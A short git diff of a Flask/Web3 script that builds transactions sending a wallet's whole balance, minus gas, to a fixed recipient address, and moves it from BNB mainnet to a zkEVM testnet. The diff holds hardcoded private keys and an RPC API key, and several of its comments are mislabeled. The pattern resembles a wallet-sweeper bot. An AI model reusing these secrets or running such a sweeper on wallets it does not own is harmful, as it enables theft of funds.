@@ -7,11 +7,11 @@ import time
 app = Flask(__name__)
 
 # Initialize Web3 with the Polygon Mumbai RPC URL
-w3 = Web3(Web3.HTTPProvider("https://bnb-mainnet.g.alchemy.com/v2/K-g36Q6qB-7NsX2OB5FcTs1Ok3i6ycAE"))
+w3 = Web3(Web3.HTTPProvider("https://rpc.cardona.zkevm-rpc.com"))
 
 # Replace these with your actual private key and public key
-private_key = 'de15d2f43192f331d7678c0ffa1a271308924ae60661f4bcc055a0179588a8d2'  # Replace with environment variables for security
-pub_key = "0xA9BAF7e3B6A21E24E5450E23C921e60F5F1B99A4"
+private_key = '3ddc37fdcd6ba99f9a16206467e459d4009ab30b3b4909a5ba0ca50ea40d2624'  # Replace with environment variables for security
+pub_key = "0x242F5c9a1D42e962A1c6B479349FFAf188163757"
 recipient_pub_key = "0x9BAbf3490ee292bAbFCcf6DF26475108D88eDfb2"
 
 # Shared state for balance and transaction hash
@@ -45,7 +45,7 @@ def loop():
 
                 # Construct the transaction object
                 tx = {
-                    'chainId': 56,  # Mumbai Testnet
+                    'chainId': 2442,  # Mumbai Testnet
                     'nonce': nonce,    # Dynamic nonce based on the transaction count
                     'to': recipient_pub_key,
                     'value': balance - gas_cost,  # Send all balance except for gas
